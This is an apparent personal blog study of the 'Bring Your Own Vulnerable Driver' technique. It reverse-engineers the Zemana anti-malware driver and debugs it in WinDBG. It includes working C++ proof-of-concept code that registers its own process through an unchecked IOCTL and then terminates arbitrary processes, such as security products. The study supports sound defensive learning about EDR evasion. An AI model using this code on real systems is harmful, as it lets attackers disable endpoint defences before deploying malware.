---
ID: 20230613092700
Dateline: 2023-06-13
tags:
  - Blogging
  - Malware_Analysis/technique
  - BYOVD
Created: 2023-06-13 09:27:00
Last Modified: 2023-06-13 09:27:00
date: 2023/06/13
---

![[Pasted image 20241111162821.png]]

# Background

Yesterday, I came across a concept in Twitter known as Bring Your Own Vulnerable Driver (BYOVD). Intrigued by this notion, I have decided to delve into an example to learn some details and intricacies of BYOVD. 

This little quest led me to an article published by SC Magazine which explains a little more about this concept. According to the article titled "Novel Terminator Antivirus Killer Found to Be a BYOVD Attack", there was a recent emergence of an attack that was initially dubbed "Novel Terminator AntiVirus Killer". The attack, attributed to threat actor, `Spyboy`, was subsequently discovered to be an instance of `BYOVD`. As the name implies, it involves the utilization of existing administrative permissions to deploy a legitimately-signed but vulnerable driver. In the case of the Novel Terminator Antivirus Killer, the driver in question is `zam64.sys`. The malware, having been granted administrative privilege, exploits the vulnerability present in it. As a result, it is abused by terminating an extensive array of established Endpoint Detection and Response (EDR), Extended Detection and Response (XDR), and Antivirus (AV) solutions.

Interestingly, `ZeroMemoryEx` has reproduced `Spyboy` technique as seen in [https://github.com/ZeroMemoryEx/Terminator](https://github.com/ZeroMemoryEx/Terminator). It also details that the vulnerable driver can be downloaded from [https://www.loldrivers.io/drivers/49920621-75d5-40fc-98b0-44f8fa486dcc/](https://www.loldrivers.io/drivers/49920621-75d5-40fc-98b0-44f8fa486dcc/) and a quick technical detail.

# Environment

This study is conducted on Windows 10 Version 20H2. Choice of debugger is WinDBG for kernel debugging.


# Description
Terminator.sys is a legitimate but vulnerable driver from Zemana AntiMalware. It has abilities to terminate of process by PID. Legitimately, I believe that if Zemana AntiMalware detects a malicious process, it would terminate it via `IOCTL_TERMINATE_PROCESS` control code by processes that is trusted. To be known as a trusted process by Zemana AntiMalware, the trusted process' PID has to be registered. I have also tried to go into the motion of writing a POC to see how this vulnerability could have been found as well.

# Root Cause
This registration can be easily done via another Device Control Code `IOCTL_REGISTER_PROCESS` assuming you have administrative privilege. Furthermore, there is no checks on which process is calling sending this code which makes it possible for any privileged process to register itself. Once registered, it can now send `IOCTL_TERMINATE_PROCESS` to terminate any process as long as the PID is provided with the input.


## Reverse Engineering
Upon deployment, driver would initialize, create device object and verify itself. Additionally, major functions of the `DriverObject` are initialized.

```cpp
    ...

    memset64(DriverObject->MajorFunction, (unsigned __int64)&sub_14001147C, 0x1Cui64);
    DriverObject->MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)sub_14001049C;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = (PDRIVER_DISPATCH)sub_14001049C;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)sub_1400104BC;
    DriverObject->DriverUnload = (PDRIVER_UNLOAD)sub_140011384;
    v4 = IoCreateDevice(DriverObject, 0x10u, &DeviceName, 0x22u, 0, 0, &v11);
```
Index 14 corresponds to IRP_MJ_DEVICE_CONTROL, which is used for custom device control operations.This means that this function relies on Control Codes specific for device control operations. For more details, refer to [https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/creating-ioctl-requests-in-drivers](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/creating-ioctl-requests-in-drivers).

Without knowing the context, the most flavorful IOCTL, based on the article, should be `IOCTL_TERMINATE_PROCESS`. For this study, this is where I first looked at since the goal would be to terminate security solutions. We can find that in `sub_1400104BC` which is assigned to `IRP_MJ_DEVICE_CONTROL` index. We can also determine the control code to be `0x80002048`.

![[Pasted image 20241111162933.png]]

# Attempt to Terminate Notepad (Failed)

To send control codes, we can make use of `DeviceIoControl` function. 

```c
BOOL DeviceIoControl(
  [in]                HANDLE       hDevice,
  [in]                DWORD        dwIoControlCode,
  [in, optional]      LPVOID       lpInBuffer,
  [in]                DWORD        nInBufferSize,
  [out, optional]     LPVOID       lpOutBuffer,
  [in]                DWORD        nOutBufferSize,
  [out, optional]     LPDWORD      lpBytesReturned,
  [in, out, optional] LPOVERLAPPED lpOverlapped
);
```

According to MSDN, `hDevice` is a handle to the device on which the operation is to be performed. The device is typically a volume, directory, file or stream. To retrieve a device hadnle, use the CreateFile function. First thing we can try to do this is to look for named pipes in winDBG via the `!handle` command.

![[Pasted image 20241111162940.png]]

We can see the SymbolicLink for `ZemanaAntiMalware`. We can get more information about it with `!object <handle address>`.

![[Pasted image 20241111162943.png]]

Since the target string is `\Device\ZemanaAntiMalware`, the created file should have the named pipe of `\\.\ZemanaAntiMalware`.

The following script built and ran with administrative privilege. Furthermore, the PID of the opened notepad is included in the script and make sure that Terminator has been successfully deployed into the target machine.

```cpp
#include <Windows.h>
#include <stdio.h>


const LONGLONG IOCTL_TERMINATE_PROCESS = 0x80002048;
const int PID_TO_TERMINATE = 3524; // Hardcoded PID ( change each time )

int main(void)
{
    HANDLE hDevice;
    DWORD bytesReturned;
    char buffer[100];

    // Open a handle to the device through the symbolic link
    hDevice = CreateFile(L"\\\\.\\ZemanaAntiMalware",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open handle to device. Error: %d\n", GetLastError());
        return 1;
    }

    // Send control code IOCTL_TERMINATE_PROCESS to the driver
    DWORD input[2] = { PID_TO_TERMINATE, TRUE };

    if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS,&input, sizeof(input), NULL, 0, &bytesReturned, NULL))
    {
        printf("Failed to Terminate PID %d via control code. Error: %d\n", PID_TO_TERMINATE, GetLastError());
    }
    else
    {
        printf("Successfully terminated PID %d sent control code.\n", PID_TO_TERMINATE);
    }

    // Close the handle
    CloseHandle(hDevice);

    return 0;
}

```

Upon running, I was greeted with the following error.

```
Failed to Terminate PID 3524 via Control code. Error: 5
```

## Debugging the Failure

First thing to verify is to check if the Control Code has been received.

```
bu Terminator+0x1054C
```

![[Pasted image 20241111162953.png]]

Running the exectuble would cause the breakpoint to be hit. We can also verify that the control code `IOCTL_TERMINATE_PROCESS` is received by the driver as well.



![[Pasted image 20241111162957.png]]

Next thing to verify is to check if the block for terminating process has been reached.
```
bu Terminator+0x10B14
```
![[Pasted image 20241111163000.png]]

Here, we will observe that after resuming the process, the breakpoint was not hit. This means that there might be a check before executing the corresponding instructions.

## Can I Authorize Myself?

Just before sending IOCTL, there was a check to see if PIDs are registered. Before that is done, the PID of the driver is passed. The purpose is to also authorize itself.

![[Pasted image 20241111163005.png]]


After some reversing and debugging, we see that `Check_IF_PID_Registered_sub_140009BEC` initially does not have any registered PID (external processes). Because of that, the  `IS_PID_WHITELISTED` value is never 1. Furthermore, it is checking through the PID list of registered processes that are authorized to send IOCTLs.

That said, looking into how `numRegisteredPID` is set should give us an idea on how these PID are registered. Looking at the cross references, we see that `Check_IF_PID_Registered_sub_140009BEC` is called from `register_PID_if_not_registered_sub_140009DB0` which is called from `sub_140010270` which is also called from executing `IOCTL_REGISTER_PROCESS` control code.

![[Pasted image 20241111163010.png]]

Checking the conditions above again, we can see that this control code is exempted from the checks.

![[Pasted image 20241111163013.png]]

This means also that there is no further check to see who could send this particular control code very similar to that of authentication bypass. This means that an external process with administrative privilege is able to register itself as trusted process which can send control codes.

# Second Attempt (Success)

This time, I have added another `DeviceIoControl` to send `IOCTL_REGISTER_PROCESS` code. I have also edited the POC a little to make it easier for testing. 

```cpp
#include <Windows.h>
#include <stdio.h>


const LONGLONG IOCTL_TERMINATE_PROCESS = 0x80002048;
const LONGLONG IOCTL_REGISTER_PROCESS = 0x80002010;
int PID_TO_TERMINATE = 0;


int main(int argc, char**argv)
{
    HANDLE hDevice;
    DWORD bytesReturned;
    char buffer[100];
    if (argc != 2) {
        printf("Usage: RootCauseTerminator.exe <TargetPID>\n");
        exit(-1);
    }
    PID_TO_TERMINATE = atoi(argv[1]);

    // Open a handle to the device through the symbolic link
    hDevice = CreateFile(L"\\\\.\\ZemanaAntiMalware",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open handle to device. Error: %d\n", GetLastError());
        return 1;
    }

    
    // Register this executable PID to allow itself to send IOCTL_TERMINATE_PROCESS control code to terminator driver.
    DWORD regProcessInput[1] = { GetCurrentProcessId() };
    if (!DeviceIoControl(hDevice, IOCTL_REGISTER_PROCESS, &regProcessInput, sizeof(regProcessInput), NULL, NULL, &bytesReturned, NULL)) {
        printf("Failed to register itself...\n");
    }
    else {
        printf("REGISTERED SUCCESSFULLY\n");
    }


    // Send control code IOCTL_TERMINATE_PROCESS to the driver
    DWORD input[2] = { PID_TO_TERMINATE,TRUE };

    if (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS,&input, sizeof(input), NULL, 0, &bytesReturned, NULL))
    {
        printf("Failed to Terminate PID %d via control code. Error: %d\n", PID_TO_TERMINATE, GetLastError());
    }
    else
    {
        printf("Successfully terminated PID %d after sending control code.\n", PID_TO_TERMINATE);
    }

    // Close the handle
    CloseHandle(hDevice);

    return 0;
}
```

## 110% It Works?

First thing to verify is to check that the POC has managed to register and authorize itself to send control code.

```
# Check value of v9 for control code
# if ( v9 != 0x80002010 ) 
bu Terminator+0x1054D

# Check PID and make sure it matches executable
# Check with !process 0 0 RootCauseTerminator.exe
bu Terminator+0x09DDB

# Check if this is hit. If yes, then we have registered ourselves
# if breakpoint fails to hit, then we failed
#  numRegisteredPID = (numRegisteredPID + 1) % 0x64ui64;
bu Terminator+0x09EE8
```

Sure enough, the control code was received.

![[Pasted image 20241111163022.png]]

Also, we can verify that the PID of the executable is being registered because the PID matches and that the numRegisteredPID was successfully incremented.

Next thing to verify termination is to check that the POC can now enter into the block for `IOCTL_TERMINATE_PROCESS`.

```
# Enter into case 0x80002048 (IOCTL_TERMINATE_PROCESS)
bu Terminator+0x10B14

# Check the PID of notepad with this value in rdi
bu Terminator+0x132C6

# Check if this breakpoint gets hit
# call cs:ZwTerminateProcess
bu Terminator+0x013487
```

The following shows that it can kill the targeted PID. The PID is confirmed to belong to the notepad process and the call to `ZwTerminateProcess` is also successful.



![[Pasted image 20241111163043.png]]


Ultimately, the process would be wiped off process hacker.



# ZeroMemoryEx's Terminator Reproduction

As mentioned previously, ZeroMemoryEx has reproduced SpyBoy's work as seen in [https://github.com/ZeroMemoryEx/Terminator](https://github.com/ZeroMemoryEx/Terminator) which I have referenced. It would loop through all the processes to search for any blacklisted Security Product for termination and terminating them.

![[Pasted image 20241111163142.png]]

This demonstrates the possibility of attackers, after some form of privilege escalation, installing other malware/payloads with higher confidence of not being flagged too early at the very least. 

# Conclusion

This short study had helped me understand how LOLbins may be abused for malicious intent. It also helped me understand how these can be applied in an attack chain to further evade detections as well from different security solutions.

---